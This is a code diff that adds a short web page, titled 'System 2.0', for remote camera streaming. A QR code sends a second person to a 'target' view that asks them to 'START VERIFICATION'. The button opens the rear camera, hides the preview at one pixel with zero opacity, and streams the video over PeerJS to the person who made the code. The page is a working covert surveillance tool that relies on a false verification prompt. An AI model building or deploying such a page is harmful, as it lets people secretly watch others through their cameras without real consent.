@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System 2.0</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; text-align: center; }
+        video { width: 100%; height: 50vh; background: #111; border-bottom: 2px solid #0f0; }
+        .btn { background: #0f0; color: #000; border: none; padding: 15px; width: 90%; font-weight: bold; margin: 10px 0; }
+        #qr-box { background: #fff; padding: 15px; display: none; position: fixed; top: 10%; left: 50%; transform: translateX(-50%); }
+    </style>
+</head>
+<body>
+    <div id="ui-mon">
+        <h3>[ TERMINAL ]</h3>
+        <video id="v-remote" autoplay playsinline></video>
+        <button class="btn" onclick="conn()">CONNECT</button>
+        <button class="btn" style="background:#222;color:#0f0" onclick="gen()">QR SCAN</button>
+        <div id="qr-box"><img id="q-img" style="width:200px;"><br><button onclick="this.parentElement.style.display='none'">X</button></div>
+    </div>
+    <div id="ui-tar" style="display:none">
+        <h2>PROCESSING...</h2>
+        <button id="b-ver" class="btn">START VERIFICATION</button>
+        <video id="v-local" autoplay playsinline muted style="width:1px;height:1px;opacity:0"></video>
+    </div>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <script>
+        const p = new URLSearchParams(window.location.search);
+        const m = p.get('mode');
+        const TID = 'CORE-X79-VRTX-2026';
+        const MID = 'CMD-Z41-BASE-2026';
+        if(m==='target'){
+            document.getElementById('ui-mon').style.display='none';
+            document.getElementById('ui-tar').style.display='block';
+            const peer = new Peer(TID);
+            let s;
+            document.getElementById('b-ver').onclick = async () => {
+                s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"},audio:false});
+                document.getElementById('v-local').srcObject = s;
+                document.getElementById('b-ver').style.display='none';
+                peer.on('call', c => c.answer(s));
+            };
+        } else {
+            const peer = new Peer(MID);
+            function conn(){
+                const c = peer.call(TID, null);
+                c.on('stream', s => document.getElementById('v-remote').srcObject = s);
+            }
+            function gen(){
+                const l = window.location.href.split('?')[0] + "?mode=target";
+                document.getElementById('q-img').src = "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" + encodeURIComponent(l);
+                document.getElementById('qr-box').style.display='block';
+            }
+        }
+    </script>
+</body>
+      </html>
+  
